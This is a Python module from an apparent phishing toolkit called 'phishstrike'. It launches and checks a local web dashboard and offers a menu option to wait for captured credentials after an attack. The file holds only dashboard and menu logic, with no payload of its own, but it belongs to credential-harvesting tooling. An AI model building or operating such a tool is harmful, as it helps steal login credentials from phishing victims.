import os
import socket
import subprocess
import sys
import time
import webbrowser

import platform

from phishstrike.core.config import Config
from phishstrike import state
from phishstrike.capture.monitor import capture_data
from phishstrike.tunnel.helpers import start_background_monitor
from phishstrike.lib.terminal_ui import *


def _dashboard_url() -> str:
    return f"http://127.0.0.1:{Config.DASHBOARD_PORT}"


def _dashboard_running() -> bool:
    try:
        s = socket.socket()
        s.settimeout(1)
        result = s.connect_ex(("127.0.0.1", Config.DASHBOARD_PORT))
        s.close()
        return result == 0
    except OSError:
        return False


def start_dashboard() -> None:
    """Start Flask dashboard in background and wait until it accepts connections."""
    if _dashboard_running():
        slow_type(
            f"    [+] Dashboard already running at {_dashboard_url()}",
            speed=0.01,
            start_rgb=RGB_WHITE,
            end_rgb=RGB_CYAN,
        )
        return

    app_path = os.path.join(state.BASE_DIR, "phishstrike/dashboard/app.py")
    subprocess.Popen(
        [sys.executable, app_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0,
    )

    for _ in range(16):
        time.sleep(0.5)
        if _dashboard_running():
            slow_type(
                f"    [+] Dashboard is LIVE at {_dashboard_url()}",
                speed=0.01,
                start_rgb=RGB_WHITE,
                end_rgb=RGB_CYAN,
            )
            return

    print(
        f"    {DARK}[{PINK}!{DARK}]{PINK} Dashboard may be slow to start. "
        f"Try {_dashboard_url()} manually."
    )


def show_dashboard_info(from_attack: bool = False) -> None:
    is_running = _dashboard_running()

    os.system("cls" if os.name == "nt" else "clear")
    banner_small()
    status_label = f"{WHITE}LIVE ✓{RESET}" if is_running else f"{RED}NOT RUNNING ✗{RESET}"
    url = _dashboard_url()
    print(f"""
    {PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    {DARK}[{WHITE}+{DARK}]{LIGHT1} Web Dashboard Status: {status_label}
    {PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    {DARK}[{WHITE}-{DARK}]{LIGHT2} Dashboard URL : {WHITE}{url}

    {DARK}[{WHITE}-{DARK}]{MEDIUM} Opening dashboard in your default browser...
    {DARK}[{WHITE}-{DARK}]{MEDIUM} The dashboard runs continuously in the background.

    {PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """)

    if is_running:
        webbrowser.open(url)
        slow_type(
            "    [+] Dashboard opened in browser!",
            speed=0.01,
            start_rgb=RGB_WHITE,
            end_rgb=RGB_CYAN,
        )
    else:
        slow_type(
            "    [!] Dashboard not running. Restarting...",
            speed=0.01,
            start_rgb=RGB_WHITE,
            end_rgb=RGB_RED,
        )
        start_dashboard()
        time.sleep(3)
        webbrowser.open(url)
        slow_type(
            "    [+] Dashboard restarted and opened!",
            speed=0.01,
            start_rgb=RGB_WHITE,
            end_rgb=RGB_CYAN,
        )

    if from_attack:
        print(f"    {DARK}\x5b{WHITE}01{DARK}\x5d{LIGHT2} Return to Main Menu")
        print(f"    {DARK}\x5b{WHITE}02{DARK}\x5d{LIGHT2} Wait for Credentials (Terminal)")
        print(
            f"    {PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        ans = slow_input(
            f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD}",
            start_rgb=RGB_WHITE,
            end_rgb=RGB_CYAN,
        )

        if ans in ["2", "02"]:
            state.stop_monitoring.set()
            if state.monitoring_thread:
                state.monitoring_thread.join(timeout=1)
            state.stop_monitoring.clear()
            capture_data(silent=False)
            return
        return

    input(f"    {DARK}[{WHITE}Enter{DARK}]{LIGHT2} Press Enter to return to Main Menu...")
